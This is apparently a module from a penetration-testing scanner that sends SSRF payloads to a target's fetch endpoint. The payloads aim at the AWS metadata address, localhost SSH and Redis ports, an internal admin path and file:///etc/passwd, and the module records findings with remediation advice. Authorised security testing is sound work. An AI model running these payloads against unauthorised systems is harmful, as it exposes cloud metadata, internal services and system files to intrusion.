"""Server-Side Request Forgery (SSRF) testing tools module."""
import logging
from typing import Dict, Any, List
from models.session import Finding
from tools.base import BaseTool

logger = logging.getLogger(__name__)


class SsrfTools(BaseTool):
    @property
    def tool_name(self) -> str:
        return "ssrf"

    @property
    def description(self) -> str:
        return "Server-Side Request Forgery (SSRF) testing tools"

    async def run_ssrf(self, session_id: str, target: str, **kwargs) -> Dict[str, Any]:
        """Run SSRF tests."""
        findings = []
        raw = {}

        fetch_url = kwargs.get("fetch_url", f"{target}/api/fetch")

        payloads = [
            ("aws_metadata", "http://169.254.169.254/latest/meta-data/"),
            ("localhost_ssh", "http://localhost:22"),
            ("localhost_redis", "http://127.0.0.1:6379"),
            ("internal_service", "http://internal-service/admin"),
            ("file_scheme", "file:///etc/passwd"),
        ]

        for test_name, payload_url in payloads:
            cmd = (
                f"curl -s -X POST {fetch_url} "
                f"-H 'Content-Type: application/json' "
                f"-d '{{\"url\":\"{payload_url}\"}}'"
            )
            result = await self._execute(cmd, session_id, timeout=30)
            raw[test_name] = result

            if result.get("returncode") == 0:
                stdout = result.get("stdout", "")
                # Check for successful fetch indicators
                indicators = {
                    "aws_metadata": ["ami-id", "instance-id", "hostname", "local-ipv4"],
                    "localhost_ssh": ["ssh", "openssh", "protocol"],
                    "localhost_redis": ["+ok", "-err", "redis"],
                    "internal_service": ["<html", "{", "admin", "dashboard"],
                    "file_scheme": ["root:", "bin/", "usr/", "etc/"],
                }

                found_indicators = [ind for ind in indicators.get(test_name, []) if ind in stdout.lower()]
                if found_indicators:
                    findings.append(Finding(
                        session_id=session_id,
                        attack_type="ssrf",
                        confidence=0.9,
                        endpoint=fetch_url,
                        parameter="url",
                        evidence=f"SSRF confirmed: {test_name} fetched content. Indicators: {', '.join(found_indicators[:3])}. Output: {stdout[:200]}",
                        status="confirmed",
                        cvss_score=8.6,
                        severity="high",
                        remediation="Validate and sanitize all URLs; use allowlists; block internal IPs and file:// scheme",
                    ))

        if not findings:
            findings.append(Finding(
                session_id=session_id,
                attack_type="ssrf",
                confidence=0.8,
                endpoint=fetch_url,
                evidence="SSRF payloads did not return internal/cloud content",
                status="potential",
                cvss_score=0.0,
                severity="info",
            ))

        return {"findings": [f.model_dump() for f in findings], "raw": raw}
